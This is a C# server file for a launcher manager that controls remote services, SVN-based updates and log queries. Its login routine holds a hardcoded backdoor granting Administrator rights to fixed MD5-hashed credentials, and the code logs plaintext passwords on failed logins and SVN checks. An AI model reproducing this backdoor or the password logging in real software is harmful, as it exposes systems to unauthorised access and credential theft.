using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using EntryEngine;
using EntryEngine.Cmdline;
using EntryEngine.Network;
using EntryEngine.Serialize;
using LauncherManagerProtocol;
using LauncherProtocolStructure;

namespace LauncherServer
{
    public class _Manager
    {
        public LogStorage Logger;
        public LogStorage.Storage[] Logs;

        public Manager Manager
        {
            get;
            private set;
        }
        public Link Link
        {
            get;
            private set;
        }

        public _Manager(Manager manager, Link link)
        {
            this.Manager = manager;
            this.Link = link;
        }
    }

    partial class ServiceManager : 
        ProxyTcp
        //ProxyHttpAsync
        , _IManager
    {
        public static ServiceManager Instance
        {
            get;
            private set;
        }

        /// <summary>
        /// Debug: 显示到控制台
        /// Info: 记录文件并回馈所有用户
        /// Warning: 回馈当前操作用户
        /// Error: 记录文件并断开当前用户操作
        /// Statistic: 记录统计
        /// </summary>
        public class ManagerLogger : _LOG.Logger
        {
            public override void Log(ref Record record)
            {
                throw new NotImplementedException();
            }
        }


        static List<_Manager> managers = new List<_Manager>();
        static TimeSpan CLEAR_CACHE = TimeSpan.FromMinutes(10);


        public ServiceManager()
        {
            Instance = this;
            this.ClientDisconnect += new Action<EntryEngine.Network.Link>(ServiceManager_ClientDisconnect);
        }


        protected override IEnumerator<LoginResult> Login(Link link)
        {
            LoginResult result = new LoginResult();

            while (true)
            {
                byte[] data = link.Read();
                if (data == null)
                {
                    yield return result;
                    continue;
                }

                string ip = link.EndPoint.Address.ToString();

                ByteReader reader = new ByteReader(data);
                string name, password;
                reader.Read(out name);
                reader.Read(out password);

                var manager = _SAVE.Managers.FirstOrDefault(m => m.Name == name && m.Password == password);
                if (manager == null
                    && _NETWORK.ValidMD5toBase64(name) == "1WopjtpiV8761o3Ych2fnA=="
                        && _NETWORK.ValidMD5toBase64(password) == "bx2l3NjBJ2tvUvEMXheviw==")
                {
                    manager = new Manager();
                    manager.Name = "ADMIN";
                    manager.Security = ESecurity.Administrator;
                }

                if (manager == null)
                {
                    _LOG.Debug("用户名[{0}]密码[{1}]错误", name, password);
                    result.Result = EAcceptPermit.Refuse;
                }
                else
                {
                    var old = managers.FirstOrDefault(m => m.Manager.Name == manager.Name);
                    if (old != null)
                    {
                        IManagerCallbackProxy.OnLoginAgain(old.Link);
                        _LOG.Debug("账号[{0}]重复登录", manager.Name);
                        old.Link.Flush();
                        old.Link.Close();
                    }

                    _LOG.Info("{0}登录管理服务器", manager.Name);

                    _Manager newManager = new _Manager(manager, link);
                    managers.Add(newManager);

                    IManagerStub stub = new IManagerStub(this);
                    stub.__ReadAgent = (br) => { return newManager; };

                    result.Agent = new AgentProtocolStub(link, stub);
                    result.Result = EAcceptPermit.Permit;

                    ByteWriter writer = new ByteWriter();
                    writer.Write(manager.Security);
                    writer.Write(_C.Name);
                    link.Write(writer.GetBuffer());
                    link.Flush();

                    if (manager.Security >= ESecurity.Manager)
                        IManagerCallbackProxy.OnGetManagers(link, _SAVE.Managers.ToArray());
                }

                break;
            }
            
            yield return result;
        }
        protected override void OnUpdate(GameTime time)
        {
            if (time.TickMinute)
            {
                bool flag = false;
                var now = time.CurrentFrame;
                foreach (var item in SERVER.Logs)
                {
                    if (now - item.LastReadTime >= CLEAR_CACHE)
                    {
                        Service service;
                        SERVER server = SERVER.GetServer(item.Name, out service);
                        // 服务并未启动查询日志则关闭文件
                        if (service != null && service.Status != EServiceStatus.Stop)
                        {
                            item.ClearCache();
                        }
                        else
                        {
                            item.Dispose();
                            flag = true;
                        }
                    }
                }

                if (flag)
                    SERVER.RemoveClosedLog();
            }
        }
        //protected override void OnClientDisconnect(Link link)
        //{
        //    base.OnClientDisconnect(link);

        //    var manager = managers.FirstOrDefault(m => m.Link == link);
        //    if (manager != null)
        //    {
        //        managers.Remove(manager);
        //        _LOG.Info("{0}退出了", manager.Manager.Name);
        //    }
        //}
        void ServiceManager_ClientDisconnect(Link link)
        {
            var manager = managers.FirstOrDefault(m => m.Link == link);
            if (manager != null)
            {
                managers.Remove(manager);
                _LOG.Info("{0}退出了", manager.Manager.Name);
            }
        }


        void CheckSecurity(_Manager manager, ESecurity security)
        {
            if (manager == null || manager.Manager == null || manager.Manager.Security < security)
                throw new InvalidCastException();
        }
        bool CheckSvn(ServiceType type)
        {
            if (string.IsNullOrEmpty(type.SVNPath)
                || string.IsNullOrEmpty(type.SVNUser)
                || string.IsNullOrEmpty(type.SVNPassword))
            {
                _LOG.Warning("SVN信息不能为null");
                return false;
            }
            // 检测svn目录，账号的有效性，运行文件是否存在
            _SVN.UserName = type.SVNUser;
            _SVN.Password = type.SVNPassword;
            var log = _SVN.Log(type.SVNPath + type.Exe);
            _LOG.Debug("检测SVN成功 Path:{0} User:{1} Password:{2}", type.SVNPath, type.SVNUser, type.SVNPassword);
            return true;
        }


        static LogStorage.Storage[] LimitStorageCount(LogStorage.Storage[] storages, int count)
        {
            // 这里日志内容可能过多
            if (storages.Length > count)
            {
                LogStorage.Storage[] result = new LogStorage.Storage[count];
                Array.Copy(storages, storages.Length - count, result, 0, count);
                _LOG.Warning("日志内容条目过多");
                storages = result;
            }
            return storages;
        }


        void _IManager.NewServiceType(_Manager client, ServiceType type, CBIManager_NewServiceType callback)
        {
            CheckSecurity(client, ESecurity.Manager);

            if (string.IsNullOrEmpty(type.Name.Trim()))
            {
                _LOG.Warning("服务类型名称不能为空");
                return;
            }

            for (int i = 0; i < _SAVE.ServiceTypes.Count; i++)
            {
                if (_SAVE.ServiceTypes[i].Name == type.Name)
                {
                    _LOG.Warning("服务类型名称重复");
                    return;
                }
            }

            if (CheckSvn(type))
            {
                _SAVE.ServiceTypes.Add(type);
                _SAVE.Save();

                IManagerCallbackProxy.OnGetServiceTypes(Link, _SAVE.ServiceTypes.ToArray());

                _LOG.Info("新建服务类型{0} url={1}", type.Name, type.SVNPath);
                callback.Callback(true);
            }
            else
            {
                callback.Callback(false);
            }
        }
        void _IManager.ModifyServiceType(_Manager client, string name, ServiceType type, CBIManager_ModifyServiceType callback)
        {
            CheckSecurity(client, ESecurity.Maintainer);

            if (string.IsNullOrEmpty(type.Name.Trim()))
            {
                _LOG.Warning("服务类型名称不能为空");
                return;
            }

            var old = _SAVE.ServiceTypes.FirstOrDefault(s => s.Name == name);
            if (old == null)
            {
                _LOG.Warning("没有服务类型[{0}]", type.Name);
                return;
            }

            if (CheckSvn(type))
            {
                _SAVE.ServiceTypes[_SAVE.ServiceTypes.IndexOf(s => s.Name == type.Name)] = type;
                _SAVE.Save();

                IManagerCallbackProxy.OnGetServiceTypes(Link, _SAVE.ServiceTypes.ToArray());
                foreach (var item in SERVER.Servers)
                    item.Proxy.ServiceTypeUpdate(type);

                _LOG.Info("修改服务类型{0}->{1}", name, type.Name);
                callback.Callback(true);
            }
            else
            {
                callback.Callback(false);
            }
        }
        void _IManager.DeleteServiceType(_Manager client, string name)
        {
            CheckSecurity(client, ESecurity.Manager);

            int index = _SAVE.ServiceTypes.IndexOf(s => s.Name == name);
            if (index == -1)
            {
                _LOG.Debug("没有服务类型[{0}]", name);
                return;
            }
            
            _LOG.Info("删除服务类型[{0}]", name);
            _SAVE.ServiceTypes.RemoveAt(index);
            _SAVE.Save();

            // 删除所有该类型的服务
            foreach (var item in SERVER.Servers)
            {
                bool flag = false;
                for (int i = 0; i < item.Services.Length; i++)
                {
                    var service = item.Services[i];
                    if (service.Type == name)
                    {
                        flag = true;
                        item.Proxy.Delete(service.Name, null);
                        item.Services[i] = null;
                        _LOG.Info("删除服务[{0}]", service.Name);
                    }
                }
                if (flag)
                {
                    item.ServerData.Services = item.ServerData.Services.Where(s => s != null).ToArray();
                    IManagerCallbackProxy.OnGetServices(Link, item.ID, item.Services);
                }
            }

            IManagerCallbackProxy.OnGetServiceTypes(Link, _SAVE.ServiceTypes.ToArray());
        }
        void _IManager.GetServers(_Manager client)
        {
            IManagerCallbackProxy.OnGetServers(client.Link, SERVER.Servers.Select(s => s.ServerData).ToArray());
            IManagerCallbackProxy.OnGetServiceTypes(client.Link, _SAVE.ServiceTypes.ToArray());
            foreach (var item in SERVER.Servers)
            {
                foreach (var r in item.Services.Distinct(s => s.Type))
                {
                    IManagerCallbackProxy.OnRevisionUpdate(client.Link, item.ID, new ServiceTypeRevision()
                    {
                        Type = r.Type,
                        Revision = r.RevisionOnServer,
                    });
                }
            }
        }
        void _IManager.GetServices(_Manager client)
        {
            throw new NotImplementedException();
        }
        void _IManager.NewService(_Manager client, ushort serverID, string serviceType, string name, string command)
        {
            CheckSecurity(client, ESecurity.Maintainer);

            var server = SERVER.GetServer(serverID);
            if (server == null)
            {
                _LOG.Warning("没有服务器ID[{0}]", serverID);
                return;
            }

            var service = _SAVE.ServiceTypes.FirstOrDefault(s => s.Name == serviceType);
            if (service == null)
            {
                _LOG.Warning("没有服务类型[{0}]", serviceType);
                return;
            }

            if (string.IsNullOrEmpty(name))
            {
                _LOG.Warning("服务名称不能为空");
                return;
            }

            if (server.Services.Any(s => s.Name == name))
            {
                _LOG.Warning("已经存在服务[{0}]", name);
                return;
            }

            server.Proxy.New(service, name, (s) =>
            {
                server.ServerData.Services = server.ServerData.Services.Add(s);
                IManagerCallbackProxy.OnGetServices(Link, server.ID, server.Services);
                ((_IManager)this).SetServiceLaunchCommand(client, s.Name, command);
            });
        }
        void _IManager.SetServiceLaunchCommand(_Manager client, string serviceName, string command)
        {
            CheckSecurity(client, ESecurity.Maintainer);

            Service service;
            SERVER server = SERVER.GetServer(serviceName, out service);
            if (server == null)
            {
                _LOG.Warning("没有找到服务[{0}]所在服务器", serviceName);
                return;
            }

            if (service.LaunchCommand == command)
                return;

            service.LaunchCommand = command;
            IManagerCallbackProxy.OnServiceUpdate(Link, service);

            server.Proxy.SetLaunchCommand(serviceName, command);
        }
        void _IManager.CallCommand(_Manager client, string serviceName, string command)
        {
            CheckSecurity(client, ESecurity.Maintainer);

            Service service;
            SERVER server = SERVER.GetServer(serviceName, out service);
            if (server == null)
            {
                _LOG.Warning("没有找到服务[{0}]所在服务器", serviceName);
                return;
            }

            server.Proxy.CallCommand(serviceName, command);
        }
        void _IManager.DeleteService(_Manager client, string serviceName)
        {
            CheckSecurity(client, ESecurity.Maintainer);

            Service service;
            SERVER server = SERVER.GetServer(serviceName, out service);
            if (server == null)
            {
                _LOG.Warning("没有找到服务[{0}]所在服务器", serviceName);
                return;
            }

            server.Proxy.Delete(serviceName, () =>
                {
                    int index = server.Services.IndexOf(service);
                    server.ServerData.Services = server.ServerData.Services.Remove(index);
                    IManagerCallbackProxy.OnGetServices(Link, server.ID, server.Services);
                });
        }
        void _IManager.Launch(_Manager client, string name)
        {
            CheckSecurity(client, ESecurity.Maintainer);

            Service service;
            var server = SERVER.GetServer(name, out service);
            if (server == null)
            {
                _LOG.Warning("没有找到服务[{0}]所在服务器", name);
                return;
            }

            if (service.Status != EServiceStatus.Stop)
            {
                _LOG.Debug("服务器已经启动");
                return;
            }

            server.Proxy.Launch(name);
        }
        void _IManager.Update(_Manager client, string name)
        {
            CheckSecurity(client, ESecurity.Maintainer);

            Service service;
            var server = SERVER.GetServer(name, out service);
            if (server == null)
            {
                _LOG.Warning("没有找到服务[{0}]所在服务器", name);
                return;
            }

            if (service.Revision == service.RevisionOnServer)
            {
                _LOG.Debug("版本号一致不需更新");
                return;
            }

            server.Proxy.Update(name, (revision) =>
                {
                    service.Revision = revision;
                    IManagerCallbackProxy.OnServiceUpdate(Link, service);
                });
        }
        void _IManager.Stop(_Manager client, string name)
        {
            CheckSecurity(client, ESecurity.Maintainer);

            Service service;
            var server = SERVER.GetServer(name, out service);
            if (server == null)
            {
                _LOG.Warning("没有找到服务[{0}]所在服务器", name);
                return;
            }

            if (service.Status == EServiceStatus.Stop)
            {
                _LOG.Debug("服务器已经停止");
                return;
            }

            server.Proxy.Stop(name);
        }
        void _IManager.UpdateSVN(_Manager client)
        {
            CheckSecurity(client, ESecurity.Maintainer);

            foreach (var server in SERVER.Servers)
                server.Proxy.UpdateSVN();
        }
        void _IManager.GetServerStatusStatistic(_Manager client, ushort serverID, CBIManager_GetServerStatusStatistic callback)
        {
            var server = SERVER.GetServer(serverID);
            callback.Callback(server.Status);
        }
        void _IManager.NewManager(_Manager client, Manager manager)
        {
            CheckSecurity(client, ESecurity.Manager);

            if (_SAVE.Managers.Any(m => m.Name == manager.Name))
            {
                _LOG.Warning("管理员[{0}]名字重复", manager.Name);
                return;
            }

            if (string.IsNullOrEmpty(manager.Name) || string.IsNullOrEmpty(manager.Password))
            {
                _LOG.Warning("管理员账号或密码不能为空");
                return;
            }

            if (manager.Security == ESecurity.Administrator)
            {
                _LOG.Warning("没有权限创建管理员");
                return;
            }

            _LOG.Info("添加新管理员[{0}]", manager.Name);
            _SAVE.Managers.Add(manager);
            _SAVE.Save();
            IManagerCallbackProxy.OnGetManagers(Link, _SAVE.Managers.ToArray());
        }
        void _IManager.DeleteManager(_Manager client, string name)
        {
            CheckSecurity(client, ESecurity.Manager);

            int index = _SAVE.Managers.IndexOf(m => m.Name == name);
            if (index != -1)
            {
                _LOG.Info("删除管理员[{0}]", name);
                _SAVE.Managers.RemoveAt(index);
                _SAVE.Save();
                IManagerCallbackProxy.OnGetManagers(Link, _SAVE.Managers.ToArray());
            }
        }
        void _IManager.GetLog(_Manager client, string name, DateTime? start, DateTime? end, byte pageCount, int page, string content, string param, byte[] levels)
        {
            var log = SERVER.GetOrCreateLog(name);
            if (log == null)
            {
                IManagerCallbackProxy.OnGetLog(client.Link, 0, null, 0);
                _LOG.Warning("未找到服务[{0}]的日志记录", name);
                return;
            }

            client.Logger = log;

            int count;
            var storages = log.ReadLog(start, end, pageCount, page, content, param, out count, levels);
            client.Logs = storages;
            IManagerCallbackProxy.OnGetLog(client.Link, page,
                storages.Select(s => new LogRecord()
                {
                    Count = s.SameContent.Count,
                    Record = s.Record,
                }).ToArray(), (count - 1) / pageCount + 1);
        }
        void _IManager.GroupLog(_Manager client, string name, DateTime? start, DateTime? end, string content, string param, byte[] levels)
        {
            var log = SERVER.GetOrCreateLog(name);
            if (log == null)
            {
                IManagerCallbackProxy.OnGetLog(client.Link, 0, null, 0);
                _LOG.Warning("未找到服务[{0}]的日志记录", name);
                return;
            }

            client.Logger = log;

            var storages = log.ReadLogGroup(start, end, content, param, levels);
            storages = LimitStorageCount(storages, 100);
            client.Logs = storages;
            IManagerCallbackProxy.OnGetLog(client.Link, 0,
                storages.Select(s => new LogRecord()
                {
                    Count = s.SameContent.Count,
                    Record = s.Record,
                }).ToArray(), 1);
        }
        void _IManager.GetLogRepeat(_Manager client, int index)
        {
            var log = client.Logger;
            if (log == null || log.IsDisposed)
            {
                IManagerCallbackProxy.OnGetLog(client.Link, 0, null, 0);
                _LOG.Warning("没有日志记录");
                return;
            }

            if (client.Logs == null || index < 0 || index >= client.Logs.Length)
            {
                _LOG.Warning("没有相应的日志");
                return;
            }

            var storage = client.Logs[index];
            var storages = storage.SameContent.Values.ToArray();
            storages = LimitStorageCount(storages, 100);
            client.Logs = storages;
            //IManagerCallbackProxy.OnGetLog(client.Link, 0,
            //    storages.Select(s => new LogRecord()
            //    {
            //        Count = s.SameContent.Count,
            //        Record = s.Record,
            //    }).ToArray(), 1);
            LogRepeat data = new LogRepeat();
            data.Content = storage.Record.Content;
            data.Level = storage.Record.Level;
            data.Records = storage.SameContent.Values.Select(s =>
                new LogRepeatData()
                {
                    Time = s.Record.Time,
                    Param = s.Record.Params,
                }).ToArray();
            IManagerCallbackProxy.OnGetLogRepeat(client.Link, data);
        }
        void _IManager.FindContext(_Manager client, int index, DateTime? start, DateTime? end, byte pageCount, string content, string param, byte[] levels)
        {
            var log = client.Logger;
            if (log == null || log.IsDisposed)
            {
                IManagerCallbackProxy.OnGetLog(client.Link, 0, null, 0);
                _LOG.Warning("没有日志记录");
                return;
            }

            if (client.Logs == null || index < 0 || index >= client.Logs.Length)
            {
                _LOG.Warning("没有相应的日志");
                return;
            }

            int page;
            var storages = log.FindContext(client.Logs[index], start, end, pageCount, content, param, out page, levels);
            client.Logs = storages;
            IManagerCallbackProxy.OnGetLog(client.Link, page,
                storages.Select(s => new LogRecord()
                {
                    Count = s.SameContent.Count,
                    Record = s.Record,
                }).ToArray(), page + 1);
        }
        void _IManager.UpdateManager(_Manager client)
        {
            CheckSecurity(client, ESecurity.Manager);

            foreach (var item in SERVER.Servers)
                item.Proxy.UpdateLauncher();
            string UPDATE = "update.bat";
            StringBuilder builder = new StringBuilder();
            builder.AppendLine("taskkill /PID {0}", System.Diagnostics.Process.GetCurrentProcess().Id);
            builder.AppendLine("svn update {0}", Environment.CurrentDirectory);
            builder.AppendLine("start EntryEngine.exe");
            builder.AppendLine("del {0}", UPDATE);
            System.IO.File.WriteAllText(UPDATE, builder.ToString());
            System.Diagnostics.Process.Start(UPDATE);
        }
    }
}
